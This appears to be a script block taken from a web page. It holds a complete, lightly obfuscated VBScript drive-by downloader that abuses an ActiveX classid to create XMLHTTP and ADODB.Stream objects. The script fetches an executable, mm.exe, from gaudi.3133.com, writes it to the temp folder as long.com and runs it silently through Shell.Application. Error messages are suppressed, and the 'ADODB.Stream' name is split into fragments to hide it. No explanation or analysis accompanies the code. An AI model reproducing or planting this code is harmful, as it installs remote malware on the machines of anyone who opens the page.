<script language="VBScript">
  on error resume next
  yuqi7="object"
  yuqi6="classid"
  xing1="long.com"
  g4="eam"
  yuqi4="Microsoft.XMLHTTP"
  yuqi3="GET"
  g1="Ado"
  yuqi5="clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
  g2="db."
  yuqi2="Scripting.FileSystemObject"
  yuqi="Shell.Application"
  diz="http://gaudi.3133.com/mm.exe"
  Set yy = document
  g3="str"
  Set od = yy.createElement(yuqi7)
  set pp = aaaa 
  od.setAttribute yuqi6, yuqi5
  str=yuqi4
  Set r = od.CreateObject(str,"")
  long1=g1&g2&g3&g4
  long5=long1
  set g = od.createobject(long5,"")
  g.type = 1
  long6=yuqi3
  r.Open long6, diz, False
  r.Send
  set j = od.createobject(yuqi2,"")
  set opd = j.GetSpecialFolder(2) 
  g.open
  xing1= j.BuildPath(opd,xing1)
  g.write r.responseBody
  g.savetofile xing1,2
  g.close
  set t = od.createobject(yuqi,"")
  t.ShellExecute xing1,"","","open",0
  </script>